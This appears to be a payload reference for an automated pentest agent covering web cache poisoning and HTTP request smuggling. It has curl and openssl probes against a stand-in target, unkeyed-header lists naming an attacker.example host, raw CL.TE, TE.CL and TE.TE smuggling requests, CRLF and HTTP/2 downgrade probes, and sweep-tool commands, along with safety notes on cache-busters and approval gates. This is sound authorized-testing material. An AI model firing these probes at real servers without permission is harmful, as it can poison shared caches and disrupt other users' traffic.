# payloads — cache-smuggling-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico_ Web Cache Poisoning e HTTP Smuggling.md` (Section 5: PAYLOADS / PROBES)

All probes are non-destructive — an `X-Forwarded-Host` reflection or a
CL.TE desync. Do NOT submit probes that poison user-facing pages on
production without `destructive_testing: approved` — a single poisoned
CDN entry can affect every visitor.

---

## Part A — Web Cache Poisoning

### A1. Unkeyed-Header Reflection Probe

Inject a custom header and check whether its value appears in the
response (script src, absolute URL, Location, etc.):

```bash
curl -s -D - "https://target.example/" \
  -H "X-Forwarded-Host: poisoning-probe.attacker.example" | \
  grep -i "poisoning-probe.attacker.example"
```

If a match appears in the body or in a `Location` header, the header is
reflected. Next, verify it's also UNKEYED (not part of the cache key):

```bash
# Same URL, different IP / different User-Agent — check for cache hit
curl -s -D - "https://target.example/" | grep -iE 'age|x-cache|cf-cache-status'
```

### A2. Common Unkeyed Header Names

Send each probe separately and grep the response:

```
X-Forwarded-Host: PROBE.attacker.example
X-Forwarded-For:  PROBE.attacker.example
X-Host:           PROBE.attacker.example
X-Forwarded-Scheme: https
X-Forwarded-Proto:  https
X-Original-URL:   /admin/PROBE
X-Rewrite-URL:    /admin/PROBE
X-Override-URL:   /admin/PROBE
X-HTTP-Host-Override: PROBE.attacker.example
Forwarded:        host=PROBE.attacker.example
X-Accept-Version: PROBE
```

### A3. Param-Cloaking Probes

Query string parameters may be unkeyed — vary each and check caching:

```
https://target/?utm_source=attacker-value
https://target/?callback=PROBE
https://target/?fbclid=PROBE
https://target/?jsessionid=PROBE
```

### A4. Fat-GET Request Smuggling (POST body on a GET URL)

Some caches key only on method + URL; the body influences the origin
server but not the cache:

```http
GET /search?q=test HTTP/1.1
Host: target.example
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

extra_param=attacker
```

### A5. Cache Confirmation

After the reflected value is in the response, poll from a SECOND IP
(or use `Cache-Control: only-if-cached`) to prove cross-user delivery:

```bash
# From a fresh connection / different machine
curl -s "https://target.example/" | grep poisoning-probe
# If the poisoned response is returned, the cache is poisoned.
```

### A6. Cache-Buster Baseline

Always isolate your probes with a unique cache-buster so you don't
poison a shared cache entry for real users:

```
https://target.example/?cb=testrun-{uuid}
```

---

## Part B — HTTP Request Smuggling

### B1. CL.TE Probe (front-end CL, back-end TE)

Front-end uses Content-Length; back-end uses Transfer-Encoding. The
"Z" ends up as the prefix of the NEXT request.

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 6
Transfer-Encoding: chunked

0

Z
```

Send that twice back-to-back on the same connection with
`--http1.1`:

```bash
# Using Burp Repeater's "Update Content-Length" toggle OFF,
# or raw via netcat / socat:
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nZ' | \
  openssl s_client -connect target.example:443 -servername target.example -ign_eof
```

Expected if vulnerable: the second request sees `ZPOST / HTTP/1.1` on
the socket and returns 400 "bad method" or processes the smuggled
request.

### B2. TE.CL Probe (front-end TE, back-end CL)

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

7d
GPOST / HTTP/1.1
Host: target.example

0


```

Expected if vulnerable: the back-end reads 4 bytes of body, treats
`GPOST ...` as a new request on the same connection.

### B3. TE.TE (obfuscated Transfer-Encoding)

Use TE-obfuscation to make front-end and back-end disagree about
which TE value to trust:

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

7d
GPOST / HTTP/1.1
Host: target.example

0


```

Other obfuscations:

```
Transfer-Encoding: chunked\x20      (trailing space)
Transfer-Encoding :chunked          (space before colon)
Transfer-Encoding: chunked\x0Bchunked  (vertical tab)
Transfer-encoding: chunked          (case variation)
```

### B4. CRLF Injection Probe

If URL / parameter reflection is in a header context, test CRLF:

```
GET /redirect?to=https://target%0d%0aX-Injected%3a%20yes HTTP/1.1
```

Look for `X-Injected: yes` in the response headers.

### B5. HTTP/2 Downgrade Smuggling (h2c, http2-to-1)

Front-end speaks HTTP/2, back-end HTTP/1.1 — header smuggling via
`transfer-encoding` pseudo-header:

```
:method: POST
:path: /
:authority: target.example
transfer-encoding: chunked
content-length: 5

0

GPOST
```

Requires a HTTP/2-capable client (nghttp2, h2load, Burp HTTP/2 tab).

---

## Sweep Commands

```bash
# Smuggler (tool by @defparam) — automated CL.TE / TE.CL / TE.TE probes
# https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.example

# Param Miner (Burp extension, free) — automates unkeyed-header
# discovery with a large wordlist.

# h2csmuggler — tests HTTP/2 downgrade smuggling
h2csmuggler -u https://target.example/ -p "GET /admin HTTP/1.1"
```

---

## Detection Signals

| Signal                                                           | Likely finding                     |
|------------------------------------------------------------------|------------------------------------|
| `X-Forwarded-Host: PROBE` → `<script src="https://PROBE/..."/>` | Unkeyed-header poisoning possible  |
| CL.TE probe returns 400 on the second request                    | CL.TE desync confirmed             |
| TE.CL probe returns the smuggled response on a chained request   | TE.CL desync confirmed             |
| `Age: 3600` on a response whose content depends on an unkeyed value | Cached poisoning in effect       |

---

## Safety Notes

- Use a unique cache-buster (`?cb=UUID`) on every probe to avoid
  poisoning a shared cache entry that real users would fetch.
- HTTP Smuggling probes can break connections and cause 502 / 504 for
  legitimate traffic on the same back-end socket. Run during low-
  traffic windows.
- Do NOT send a poisoning payload with a real XSS / malicious script
  — use harmless reflections (`PROBE.attacker.example` / random string).
  The vulnerability is proven by the reflection; actual exploitation
  payloads require `destructive_testing: approved`.
